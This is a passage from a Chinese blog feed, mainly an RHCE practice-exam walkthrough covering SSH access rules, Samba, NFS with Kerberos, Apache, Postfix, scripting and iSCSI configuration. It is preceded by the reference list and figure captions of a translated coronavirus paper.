href="https://doi.org/10.1038/nature17200">https://doi.org/10.1038/nature17200</a><br>Kumar, S., Stecher, G., Li, M., Knyaz, C., &amp; Tamura, K. (2018). MEGA X: Molecular evolutionary genetics<br>analysis across computing platforms. Molecular Biology and Evolution.<br><a href="https://doi.org/10.1093/molbev/msy096">https://doi.org/10.1093/molbev/msy096</a><br>Li, F. (2016). Structure, Function, and Evolution of Coronavirus Spike Proteins. Annual Review of<br>Virology, 3(1), 237–261. <a href="https://doi.org/10.1146/annurev-virology-110615-042301">https://doi.org/10.1146/annurev-virology-110615-042301</a><br>Murakami, T. (2008). Roles of the interactions between Env and Gag proteins in the HIV-1 replication<br>cycle. Microbiology and Immunology, 52(5), 287–295. <a href="https://doi.org/10.1111/j.1348-">https://doi.org/10.1111/j.1348-</a><br>0421.2008.00008.x<br>Ou, X., Guan, H., Qin, B., Mu, Z., Wojdyla, J. A., Wang, M., Dominguez, S. R., Qian, Z., &amp; Cui, S. (2017).<br>Crystal structure of the receptor binding domain of the spike glycoprotein of human<br>betacoronavirus HKU1. Nature Communications. <a href="https://doi.org/10.1038/ncomms15216">https://doi.org/10.1038/ncomms15216</a><br>Snijder, E. J., van der Meer, Y., Zevenhoven-Dobbe, J., Onderwater, J. J. M., van der Meulen, J., Koerten,<br>H. K., &amp; Mommaas, A. M. (2006). Ultrastructure and origin of membrane vesicles associated with<br>the severe acute respiratory syndrome coronavirus replication complex. Journal of Virology,<br>80(12), 5927–5940. <a href="https://doi.org/10.1128/JVI.02501-05">https://doi.org/10.1128/JVI.02501-05</a><br>Zhou, P., Yang, X.-L., Wang, X.-G., Hu, B., Zhang, L., Zhang, W., Si, H.-R., Zhu, Y., Li, B., Huang, C.-L., Chen,<br>H.-D., Chen, J., Luo, Y., Guo, H., Jiang, R.-D., Liu, M.-Q., Chen, Y., Shen, X.-R., Wang, X., … Shi, Z.-L.<br>(2020). Discovery of a novel coronavirus associated with the recent pneumonia outbreak in<br>humans and its potential bat origin. BioRxiv. <a href="https://doi.org/10.1101/2020.01.22.914952">https://doi.org/10.1101/2020.01.22.914952</a><br>Zhu, N., Zhang, D., Wang, W., Li, X., Yang, B., Song, J., Zhao, X., Huang, B., Shi, W., Lu, R., Niu, P., Zhan, F.,<br>Ma, X., Wang, D., Xu, W., Wu, G., Gao, G. F., &amp; Tan, W. (2020). A Novel Coronavirus from Patients<br>with Pneumonia in China, 2019. New England Journal of Medicine, NEJMoa2001017.<br><a href="https://doi.org/10.1056/NEJMoa2001017">https://doi.org/10.1056/NEJMoa2001017</a><br>Fig.S1 Multiple sequence alignment of glycoprotein of coronaviridae family, representing all the<br>four inserts.<br>Fig.S2: All four inserts are present in the aligned 28 Wuhan 2019-nCoV virus genomes obtained<br>from GISAID. The gap in the Bat-SARS Like CoV in the last row shows that insert 1 and 4 is very<br>unique to Wuhan 2019-nCoV.<br>Fig.S3 Phylogenetic tree of 28 clinical isolates genome of 2019-nCoV including one from bat as a host.<br>Supplementary Fig 4. Genome alingment of Coronaviridae family. Highlighted black sequences are the<br>inserts represented here. </p>
</blockquote>
]]></content>
      <categories>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>翻译</tag>
        <tag>2019-nCov病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>RHCE练习</title>
    <url>//posts/ZH-CN/RHCE-practice.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RHCE练习题目。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="考试环境介绍"><a href="#考试环境介绍" class="headerlink" title="考试环境介绍"></a>考试环境介绍</h2><ul>
<li>虚拟机设置：取消勾选cpu的计数器<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image.png" alt="image.png"></li>
<li>虚拟机开启之后，里面还有3台虚拟机。<br>server0命名为System1，IP地址是172.25.0.11。密码：root/redhat<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image4f4761ce94367c9f.png" alt="image4f4761ce94367c9f.png"><br>desktop0命名为System2，IP地址是172.25.0.10。密码：root/redhat<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagebec6c8987836d9cd.png" alt="imagebec6c8987836d9cd.png"><br>classroom默认开机的，保持开机状态即可。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagee9a5f0f62c15d3f5.png" alt="imagee9a5f0f62c15d3f5.png"></li>
<li>可在虚拟机里面ssh到System1和System2<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image0ddb884174e8b02c.png" alt="image0ddb884174e8b02c.png"></li>
</ul>
<h2 id="配置SELINUX"><a href="#配置SELINUX" class="headerlink" title="配置SELINUX"></a>配置SELINUX</h2><p>检查一下System1和System2的selinux配置文件/etc/selinux/config<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageaf66c8730ae7b650.png" alt="imageaf66c8730ae7b650.png"></p>
<h2 id="配置SSH访问"><a href="#配置SSH访问" class="headerlink" title="配置SSH访问"></a>配置SSH访问</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户能够从域 domain1.example.com 内的客户端通过SSH远程访问您的两个虚拟机系统</span><br><span class="line">在域 my133t.org 内的客户端不能访问您的两个虚拟机系统</span><br></pre></td></tr></table></figure>
<p>对System1和System2进行相同的操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts.allow</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagea9d4784637f1e499.png" alt="imagea9d4784637f1e499.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts.deny #这里是假设my133t.org解析出的IP是172.25.0.30</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image00650e105de0ff5f.png" alt="image00650e105de0ff5f.png"></p>
<h2 id="自定义用户环境"><a href="#自定义用户环境" class="headerlink" title="自定义用户环境"></a>自定义用户环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在系统 system1 和 system2上创建自定义命令名为 qstat 此自定义命令将执行以下命令: /bin/ps -Ao pid,tt,user,fname,rsz此命令对系统中所有用户有效。</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageaab59b005930d126.png" alt="imageaab59b005930d126.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image669be386b36ccdbc.png" alt="image669be386b36ccdbc.png"></p>
<h2 id="配置端口转发"><a href="#配置端口转发" class="headerlink" title="配置端口转发"></a>配置端口转发</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在系统system1配置端口转发，要求如下：在 172.24.1.0/24 网络中的系统，访问 system1 的本地端口 5423 将被转发到80 此设置必须永久有效</span><br></pre></td></tr></table></figure>
<p>进入System1的虚拟机进行操作：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image19ceaa0d30f65dc8.png" alt="image19ceaa0d30f65dc8.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image0b98931199991896.png" alt="image0b98931199991896.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image84bf0aad57b4e869.png" alt="image84bf0aad57b4e869.png"></p>
<h2 id="配置链路聚合"><a href="#配置链路聚合" class="headerlink" title="配置链路聚合"></a>配置链路聚合</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1.domain1.example.com 和 system2.domain1.example.com 之间按以下要求配置一个链路：</span><br><span class="line">此链路使用接口 eth1 和 eth2</span><br><span class="line">此链路在一个接口失效时仍然能工作</span><br><span class="line">此链路在 system1 使用下面的地址 172.16.1.25/255.255.255.0</span><br><span class="line">此链路在 system2 使用下面的地址 172.16.1.35/255.255.255.0</span><br><span class="line">此链路在系统重启之后依然保持正常状态</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image000f5adc346e4337.png" alt="image000f5adc346e4337.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagebe58dd15bdf40f10.png" alt="imagebe58dd15bdf40f10.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image2f5573675d67c079.png" alt="image2f5573675d67c079.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image264ee7fd99770ea1.png" alt="image264ee7fd99770ea1.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image0a649aede2c681c6.png" alt="image0a649aede2c681c6.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image4c0c1bfe5e9d4832.png" alt="image4c0c1bfe5e9d4832.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imaged77b38982d6d68f7.png" alt="imaged77b38982d6d68f7.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image36bda020b3430f7c.png" alt="image36bda020b3430f7c.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image64a03f86b9abed9b.png" alt="image64a03f86b9abed9b.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image4eedc2e51594acfb.png" alt="image4eedc2e51594acfb.png"></p>
<h2 id="配置IPv6地址"><a href="#配置IPv6地址" class="headerlink" title="配置IPv6地址"></a>配置IPv6地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在您的考试系统上配置接口 eth0 使用下列IPv6地址：</span><br><span class="line">system1 上的地址应该是 2001:ac18::10a/64</span><br><span class="line">system2 上的地址应该是 2001:ac18::114/64</span><br><span class="line">两个系统必须能与网络 2001:ac18/64 内的系统通信。</span><br><span class="line">地址必须在重启后依旧生效。</span><br><span class="line">两个系统必须保持当前的IPv4地址并能通信。</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image1fdb72f1b63ce165.png" alt="image1fdb72f1b63ce165.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagebeaf0a9e85cd6d93.png" alt="imagebeaf0a9e85cd6d93.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image5c680bf959c925dc.png" alt="image5c680bf959c925dc.png"></p>
<h2 id="配置本地邮件服务"><a href="#配置本地邮件服务" class="headerlink" title="配置本地邮件服务"></a>配置本地邮件服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在系统system1 和 system2 上 配置邮件服务，满足以下要求：</span><br><span class="line">这些系统不接收外部发送来的邮件</span><br><span class="line">在这些系统上本地发送的任何邮件都会自动路由到 rhgls.domain1.example.com</span><br><span class="line">从这些系统上发送的邮件显示来自于 domain1.example.com</span><br><span class="line">您可以通过发送邮件到本地用户 &#x27;dave&#x27; 来测试您的配置， 系统 rhgls.domain1.example.com 已经配置把此用户的邮件转到下列URL http://rhgls.domain1.example.com/received_mail/1</span><br></pre></td></tr></table></figure>
<ol>
<li>编辑配置文件/etc/postfix/main.cf<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image07e7fd44d6a24ea3.png" alt="image07e7fd44d6a24ea3.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagee1fc9bcf85a2124d.png" alt="imagee1fc9bcf85a2124d.png"></li>
<li>重启postfix服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart postfix</span><br><span class="line">systemctl enable postfix</span><br></pre></td></tr></table></figure></li>
<li>配置防火墙，开放smtp服务<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image8c9a3cb598fb4edf.png" alt="image8c9a3cb598fb4edf.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image664d6001a2324971.png" alt="image664d6001a2324971.png"></li>
<li>测试：发邮件给dave，可在 <a href="http://rhgls.domain1.example.com/received_mail/1看到邮件内容，说明服务配置成功">http://rhgls.domain1.example.com/received_mail/1看到邮件内容，说明服务配置成功</a><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail -s &quot;test&quot; to dave@domain1.example.com</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="通过SMB共享服务"><a href="#通过SMB共享服务" class="headerlink" title="通过SMB共享服务"></a>通过SMB共享服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在system1上配置SMB服务</span><br><span class="line">您的 SMB 服务器必须是 STAFF 工作组的一个成员</span><br><span class="line">共享 /common 目录 共享名必须为 common</span><br><span class="line">只有 domain1.example.com 域内的客户端可以访问 common 共享</span><br><span class="line">common 必须是可以浏览的</span><br><span class="line">用户 andy 必须能够读取共享中的内容，如果需要的话，验证的密码是 flectrag</span><br></pre></td></tr></table></figure>
<ol>
<li>在System1安装samba、samba-client<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install samba samba-client</span><br></pre></td></tr></table></figure></li>
<li>创建目录/common<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /common</span><br></pre></td></tr></table></figure></li>
<li>编辑samba配置文件/etc/samba/smb.conf，重启smb、nmb并加入开机启动项<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image95cf8be4d8a6080c.png" alt="image95cf8be4d8a6080c.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image19462d25a8c61202.png" alt="image19462d25a8c61202.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart smb nmb</span><br><span class="line">systemctl enable smb nmb</span><br></pre></td></tr></table></figure></li>
<li>添加用户andy<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageda3802c78203d681.png" alt="imageda3802c78203d681.png"></li>
<li>设置防火墙，放开samba和mountd服务<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image2daa3ea99677938b.png" alt="image2daa3ea99677938b.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageeaf8760cb4a5139f.png" alt="imageeaf8760cb4a5139f.png"></li>
<li>在System2测试samba共享是否成功</li>
</ol>
<ul>
<li>安装samba-client、cifs-utils<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install samba-client cifs-utils</span><br></pre></td></tr></table></figure></li>
<li>测试samba共享目录<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageac147d48fcdee0ac.png" alt="imageac147d48fcdee0ac.png"></li>
</ul>
<h2 id="配置多用户samba挂载"><a href="#配置多用户samba挂载" class="headerlink" title="配置多用户samba挂载"></a>配置多用户samba挂载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在system1 共享通过SMB目录 /miscellaneous 满足以下要求：</span><br><span class="line">共享名为 miscellaneous</span><br><span class="line">共享目录 miscellaneous 只能被 domain1.example.com 域中的客户端使用</span><br><span class="line">共享目录 miscellaneous 必须可以被浏览</span><br><span class="line">用户 silene 必须能以读的方式访问此共享， 访问密码是 flectrag</span><br><span class="line">用户 akira 必须能以读写的方式访问此共享， 访问密码是 flectrag</span><br><span class="line">此共享永久挂载在 system2.domain1.example.com 上的 /mnt/multi 目录, 并使用用户 silene 作为认证</span><br><span class="line">任何用户可以通过用户 akira 来临时获取写的权限</span><br></pre></td></tr></table></figure>
<ol>
<li>在system1进行以下操作：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@system1 ~]# mkdir /miscellaneous/</span><br><span class="line">[root@system1 ~]# chmod o+w /miscellaneous/</span><br><span class="line">[root@system1 ~]# chcon -R -t samba_share_t /miscellaneous/</span><br><span class="line">[root@system1 ~]# smbpasswd -a silene </span><br><span class="line">[root@system1 ~]# smbpasswd -a akira</span><br><span class="line">[root@system1 ~]# vim /etc/samba/smb.conf</span><br><span class="line">[miscellaneous]</span><br><span class="line">path=/miscellaneous</span><br><span class="line">hosts allow = 172.25.0.</span><br><span class="line">browseable = yes</span><br><span class="line">writable = no</span><br><span class="line">write list = akira</span><br><span class="line">[root@system1 ~]# systemctl restart smb nmb</span><br></pre></td></tr></table></figure></li>
<li>在system2进行以下操作：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@system2 ~]# smbclient -L //172.25.0.11 -U silene</span><br><span class="line">[root@system2 ~]# yum install cifs*</span><br><span class="line">[root@system2 ~]# mkdir /mnt/multi</span><br><span class="line">[root@system2 ~]# vim /etc/fstab</span><br><span class="line">//172.24.1.5/miscellaneous     /mnt/multi    cifs  defaults,multiuser,username=silene,password=flectrag,sec=ntlmssp 0 0 </span><br><span class="line">[root@system2 ~]# mount -a</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="配置NFS共享"><a href="#配置NFS共享" class="headerlink" title="配置NFS共享"></a>配置NFS共享</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1 配置NFS服务，要求如下:</span><br><span class="line">以只读的方式共享目录 /public 同时只能被 domain1.example.com 域中的系统访问</span><br><span class="line">以读写的方式共享目录 /protected 能被 domain1.example.com 域中的系统访问</span><br><span class="line">访问 /protected 需要通过Kerberos安全加密， 您可以使用下面URL提供的密钥 http://host.domain1.example.com/materials/nfs_server.keytab</span><br><span class="line">目录 /protected 应该包含名为 confidential 拥有人为deepak 的子目录</span><br><span class="line">用户 deepak 能以读写方式访问 /protected/confidential</span><br><span class="line">在 system2 上挂载一个来自 system1.domain1.example.com 的NFS共享， 并符合下列要求：</span><br><span class="line">/public 挂载在下面的目录上 /mnt/nfsmount</span><br><span class="line">/protected 挂载在下面的目录上 /mnt/nfssecure 并使用安全的方式，密钥下载URL如下： http://host.domain1.example.com/materials/nfs_client.keytab</span><br><span class="line">用户 deepak 能够在 /mnt/nfssecure/confidential 上创建文件</span><br><span class="line">这些文件系统在系统启动时自动挂载</span><br></pre></td></tr></table></figure>
<ol>
<li>System1执行以下操作：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@system1~]# mkdir/public	</span><br><span class="line">[root@system1~]# mkdir -p /protected/confidential	</span><br><span class="line">[root@system1~]# chcon -R -t public_content_t /public/	</span><br><span class="line">[root@system1~]# chcon -R -t public_content_t /protected</span><br><span class="line">[root@system1~]# chown deepak /protected/confidential</span><br><span class="line">[root@system1~]# vim /etc/exports	</span><br><span class="line">/public 172.24.1.0/24(ro)</span><br><span class="line">/protected 172.24.1.0/24(rw,sec=krb5p)</span><br><span class="line">[root@system1~]# wget -O /etc/krb5.keytab http://host.domain1.example.com/materials/nfs_server.keytab	</span><br><span class="line">[root@system1~]# vim /etc/sysconfig/nfs	</span><br><span class="line">RPCNFSDARGS=&quot;-V4.2&quot;	</span><br><span class="line">[root@system1~]# systemctl start nfs-server nfs-secure-server	</span><br><span class="line">[root@system1~]# systemctl enable nfs-server nfs-secure-server	</span><br><span class="line">[root@system1~]# firewall-cmd --permanent --add-service=nfs		</span><br><span class="line">[root@system1~]# firewall-cmd --permanent --add-service=rpc-bind</span><br><span class="line">[root@system1~]# firewall-cmd --reload	</span><br><span class="line">[root@system1~]# exportfs -r</span><br></pre></td></tr></table></figure></li>
<li>System2执行以下操作：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@system2 ~]# showmount -e system1 </span><br><span class="line">[root@system2 ~]# systemctl start nfs-secure</span><br><span class="line">[root@system2 ~]# systemctl enable nfs-secure </span><br><span class="line">[root@system2 ~]# wget -O /etc/krb5.keytab http://host.domain1.example.com/materials/nfs_client.keytab </span><br><span class="line">[root@system2 ~]# mkdir /mnt/nfsmount  </span><br><span class="line">[root@system2 ~]# mkdir /mnt/nfssecure </span><br><span class="line">[root@system2 ~]# vim /etc/fstab</span><br><span class="line">172.24.1.5:/public /mnt/nfsmount nfs defaults 0 0 </span><br><span class="line">172.24.1.5:/protected /mnt/nfssecure nfs defaults,sec=krb5p,v4.2 0 0  </span><br><span class="line">[root@system2 ~]# mount -a</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="完成web服务器"><a href="#完成web服务器" class="headerlink" title="完成web服务器"></a>完成web服务器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1 上配置一个站点 http://system1.domain1.example.com 然后执行下述步骤：</span><br><span class="line">从 http://rhgls.domain1.example.com/materials/station.html 下载文件，并且将文件重命名为 index.html 不要修改此文件的内容</span><br><span class="line">将文件 index.html 拷贝到您的 web 服务器的 DocumentRoot 目录下</span><br><span class="line">来自于 domain1.example.com 域的客户端可以访问此Web服务</span><br><span class="line">来自于 my133t.org 域的客户端拒绝访问此Web服务</span><br></pre></td></tr></table></figure>
<ol>
<li>安装httpd<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install httpd</span><br></pre></td></tr></table></figure></li>
<li>拷贝页面内容<br>把页面内容放到/var/www/html目录，命名为index.html</li>
<li>编辑配置文件/etc/httpd/conf.d/httpd-vhosts.conf<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagec767326b23840cba.png" alt="imagec767326b23840cba.png"></li>
<li>重启httpd服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure></li>
<li>防火墙放开http、https服务<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagef66b987039f3aa71.png" alt="imagef66b987039f3aa71.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image3828ec205f4dd934.png" alt="image3828ec205f4dd934.png"></li>
</ol>
<h2 id="配置安全web服务"><a href="#配置安全web服务" class="headerlink" title="配置安全web服务"></a>配置安全web服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为站点 http://system1.domain1.example.com 配置TLS加密 一个已签名证书从 http://host.domain1.example.com/materials/system1.crt 获取 此证书的密钥从 http://host.domain1.example.com/materials/system1.key 获取 此证书的签名授权信息从 http://host.domain1.example.com/materials/domain1.crt 获取</span><br></pre></td></tr></table></figure>
<ol>
<li>安装mod_ssl模块<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mod_ssl</span><br></pre></td></tr></table></figure></li>
<li>下载证书到/var/www/html目录<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagea64cc0133ea8c0c4.png" alt="imagea64cc0133ea8c0c4.png"></li>
<li>编辑配置文件/etc/httpd/conf.d/httpd-vhosts.conf，严格区分大小写<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image0d6ed2326cbe1965.png" alt="image0d6ed2326cbe1965.png"></li>
<li>设置selinux安全上下文<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageb9fb17d4ac30a69b.png" alt="imageb9fb17d4ac30a69b.png"></li>
<li>重启httpd服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure></li>
<li>验证https服务是否生效<br>在浏览器输入<a href="https://server0.example.com，看到有一个小锁就说明配置成功。">https://server0.example.com，看到有一个小锁就说明配置成功。</a><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image2ebe237b18b9efca.png" alt="image2ebe237b18b9efca.png"></li>
</ol>
<h2 id="配置虚拟主机"><a href="#配置虚拟主机" class="headerlink" title="配置虚拟主机"></a>配置虚拟主机</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1 上扩展您的 web 服务器，为站点 http://www.domain1.example.com创建一个虚拟主机，然后执行下述步骤：</span><br><span class="line">设置 DocumentRoot 为 /var/www/virtual</span><br><span class="line">从 http://rhgls.domain1.example.com/materials/www.html</span><br><span class="line">下载文件并重命名为 index.html 不要对文件 index.html 的内容做任何修改</span><br><span class="line">将文件 index.html 放到虚拟主机的 DocumentRoot 目录下</span><br><span class="line">确保 andy 用户能够在 /var/www/virtual 目录下创建文件</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image5182ca5cf1aeba61.png" alt="image5182ca5cf1aeba61.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image0579bff384d17dcf.png" alt="image0579bff384d17dcf.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image9a9085223fe5f89a.png" alt="image9a9085223fe5f89a.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image23c590d06a9cd0db.png" alt="image23c590d06a9cd0db.png"></p>
<h2 id="配置web内容访问"><a href="#配置web内容访问" class="headerlink" title="配置web内容访问"></a>配置web内容访问</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在您的system1 上的 web 服务器的 DocumentRoot 目录下 创建一个名为 secret 的目录，要求如下：</span><br><span class="line">从 http://rhgls.domain1.example.com/materials/private.html 下载一个文件副本到这个目录，并且重命名为 index.html。</span><br><span class="line">不要对这个文件的内容做任何修改。</span><br><span class="line">从 system1 上，任何人都可以浏览 secret 的内容， 但是从其它系统不能访问这个目录的内容</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagee501b9582f16b2bc.png" alt="imagee501b9582f16b2bc.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imageacd411f9de78ca07.png" alt="imageacd411f9de78ca07.png"><br>从System2访问<a href="http://server0.example.com/secret/被拒绝，说明配置成功。">http://server0.example.com/secret/被拒绝，说明配置成功。</a><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image182c3f430b2bb5fa.png" alt="image182c3f430b2bb5fa.png"></p>
<h2 id="实现web动态内容"><a href="#实现web动态内容" class="headerlink" title="实现web动态内容"></a>实现web动态内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1 上配置提供动态Web内容，要求如下：</span><br><span class="line">动态内容由名为dynamic.domain1.example.com的虚拟主机提供</span><br><span class="line">虚拟主机侦听在端口 8998</span><br><span class="line">从 http://rhgls.domain1.example.com/materials/webapp.wsgi 下载一个脚本，然后放在适当的位置， 无论如何不要求修改此文件的内容</span><br><span class="line">客户端访问 http://dynamic.domain1.example.com:8998/ 时 应该接收到动态生成的web页面</span><br><span class="line">此 http://dynamic.domain1.example.com:8998/ 必须能被 domain1.example.com 域内的所有系统访问</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image6a14663ba8fefb4f.png" alt="image6a14663ba8fefb4f.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image9a56c7362c04a402.png" alt="image9a56c7362c04a402.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/imagefc6b980cf5f3ba65.png" alt="imagefc6b980cf5f3ba65.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/18/image8e67268d72c13cf6.png" alt="image8e67268d72c13cf6.png"></p>
<h2 id="创建一个脚本"><a href="#创建一个脚本" class="headerlink" title="创建一个脚本"></a>创建一个脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在system1上创建一个名为 /root/script 的脚本， 让其提供下列特性：</span><br><span class="line">当运行 /root/script foo，输出为 bar</span><br><span class="line">当运行 /root/script bar，输出为 foo</span><br><span class="line">当没有任何参数或者参数不是 foo 或者 bar时， 其错误输出产生以下的信息：</span><br><span class="line">/root/script foo|bar</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image.png" alt="image.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image1582bbc6feb35c68.png" alt="image1582bbc6feb35c68.png"></p>
<h2 id="创建一个添加用户的脚本"><a href="#创建一个添加用户的脚本" class="headerlink" title="创建一个添加用户的脚本"></a>创建一个添加用户的脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 system1 上创建一个脚本，名为 /root/mkusers , 此脚本能实现为系统 system1 创建本地用户, 并且这些用户 的用户名来自一个包含用户名列表的文件。同时满足下列要求：</span><br><span class="line">此脚本要求提供一个参数，此参数就是包含用户名列表的文件</span><br><span class="line">如果没有提供参数，此脚本应该给出下面的提示信息 Usage: /root/mkusers userfile 然后退出并返回相应的值</span><br><span class="line">如果提供一个不存在的文件名，此脚本应该给出下面的提示信息 Input file not found 然后退出并返回相应的值</span><br><span class="line">创建的用户登录shell为 /bin/false</span><br><span class="line">此脚本不需要为用户设置密码</span><br><span class="line">您可以从下面的URL获取用户名列表作为测试用 http://rhgls.domain1.example.com/materials/userlist</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imagec405f9affd7f78c4.png" alt="imagec405f9affd7f78c4.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/image24581bb57ab16521.png" alt="image24581bb57ab16521.png"></p>
<h2 id="配置iSCSI服务端"><a href="#配置iSCSI服务端" class="headerlink" title="配置iSCSI服务端"></a>配置iSCSI服务端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置 system1 提供一个 iSCSI 服务 磁盘名为 iqn.2014-12.com.example.domain1:system1 ，并符合下列要求：</span><br><span class="line">服务端口为 3260</span><br><span class="line">使用 iscsi_vol 作其后端卷 其大小为 3G</span><br><span class="line">此服务只能被 system2.domain1.example.com 访问</span><br></pre></td></tr></table></figure>
<ol>
<li>安装target相关软件包<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install target*</span><br></pre></td></tr></table></figure></li>
<li>重启target服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart target</span><br><span class="line">systemctl enable target</span><br></pre></td></tr></table></figure></li>
<li>设置iscsi<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/19/imageadd063403e0f2b4d.png" alt="imageadd063403e0f2b4d.png"></li>
